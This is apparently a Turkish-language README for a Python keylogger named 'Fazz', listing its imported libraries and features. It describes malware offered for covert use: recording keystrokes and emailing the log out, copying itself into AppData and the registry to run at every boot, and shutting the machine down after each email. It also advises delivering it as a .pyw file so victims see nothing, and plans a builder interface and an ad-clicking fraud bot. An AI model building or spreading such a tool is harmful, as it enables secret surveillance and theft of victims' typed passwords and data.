# Keylogger
Fazz | En Gelişmiş Python keylogger

Versiyon : 0.1

Kütüphaneler :

from pynput.keyboard import Key, Listener
import logging
import socket
import smtplib
import subprocess
import os
import shutil
import sys

Özellikler :
Keylogger
Direkt olarak keylog.txt oluşturur ve enter tuşuna basıldığında txt dosyasını mail gönderir
program başlatıldığında kendini "appdata" dosyasının içine ve regeditin içine kopyalar
her bilgisayar açıldığında kendisini tekrar açar
her mail attığında bilgisayarı kapatır

Not : dosyayı exe yaparsanız konsol gözükebilir fakat .pyw dosyası yaparak gönderirseniz hiç bir şey gözükmez

Geliştirme sürecindedir her gün yeni özellikler eklenip sizlere sunulacaktır.

Keylogger tamamlandığında keylogger oluşturabileceğiniz bir arayüz yazıcam.

Hedefler :

Program açıldığında hiç bir şey göstermemesi.
Keylogger Oluşturma arayüzü.
Otomatik reklam sitesini açıp reklama tıklatan bot.

-Fazz
